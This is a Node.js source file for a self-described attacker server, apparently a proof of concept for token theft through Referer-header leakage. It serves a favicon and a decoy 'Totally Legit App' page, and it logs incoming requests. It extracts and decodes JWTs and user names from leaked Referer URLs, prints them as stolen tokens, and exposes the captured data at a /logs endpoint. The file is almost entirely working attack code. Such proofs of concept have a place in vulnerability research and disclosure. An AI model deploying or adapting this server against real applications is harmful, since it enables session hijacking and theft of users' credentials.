const http = require('http');
const https = require('https');
const fs = require('fs');

const LOGS = [];

const server = http.createServer((req, res) => {
  const referer = req.headers['referer'] || req.headers['referrer'] || 'none';
  const entry = {
    time: new Date().toISOString(),
    method: req.method,
    path: req.url,
    referer,
    userAgent: req.headers['user-agent'],
  };

  console.log(JSON.stringify(entry, null, 2));
  LOGS.push(entry);

  // Extract JWT from referer if present
  const tokenMatch = referer.match(/token=([^&]+)/);
  if (tokenMatch) {
    const token = decodeURIComponent(tokenMatch[1]);
    const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
    console.log('\n!!! STOLEN TOKEN !!!');
    console.log('JWT:', token.substring(0, 50) + '...');
    console.log('Team ID:', payload.teamId);
    console.log('Application ID:', payload.applicationId);
    console.log('Expires:', new Date(payload.exp * 1000).toISOString());

    const userNameMatch = referer.match(/userName=([^&]+)/);
    if (userNameMatch) {
      console.log('User Name:', decodeURIComponent(userNameMatch[1]));
    }
    console.log('');
  }

  // Serve a 1x1 transparent PNG for favicon requests
  if (req.url.includes('favicon')) {
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    res.writeHead(200, { 'Content-Type': 'image/png' });
    res.end(pixel);
    return;
  }

  // Serve a simple page at /
  if (req.url === '/' || req.url === '') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<html><body><h1>Totally Legit App</h1></body></html>');
    return;
  }

  // Show captured logs at /logs
  if (req.url === '/logs') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(LOGS, null, 2));
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

const PORT = process.env.PORT || 3333;
server.listen(PORT, () => {
  console.log(`Attacker server listening on port ${PORT}`);
  console.log(`Waiting for favicon requests with leaked Referer headers...\n`);
});
